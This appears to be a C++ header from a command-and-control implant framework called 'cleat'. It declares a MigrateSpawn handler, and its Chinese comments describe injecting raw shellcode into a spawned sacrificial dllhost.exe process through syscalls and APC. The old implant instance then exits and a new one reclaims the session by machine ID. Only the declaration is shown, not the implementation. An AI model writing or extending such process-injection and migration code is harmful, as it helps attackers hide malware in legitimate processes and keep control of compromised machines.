#pragma once
#include "Core/Command/Handlers/IHandler.hpp"

namespace cleat {

    /// MigrateSpawn: 帧二进制体 = shc 裸字节([boot][loader][PE], 入口@0)。
    /// req.params: { "target": "C:\Windows\System32\dllhost.exe"(必填, 强制指定) }
    /// 语义: syscall 注入牺牲进程(spawn+APC) → 成功后本实例延迟自退,
    ///       新实例经 machine_id 认领原会话(注入与迁移设计)。
    class MigrateSpawnHandler : public IHandler {
    public:
        nlohmann::json Execute(const CommandRequest& req) override;
    };

} // namespace cleat
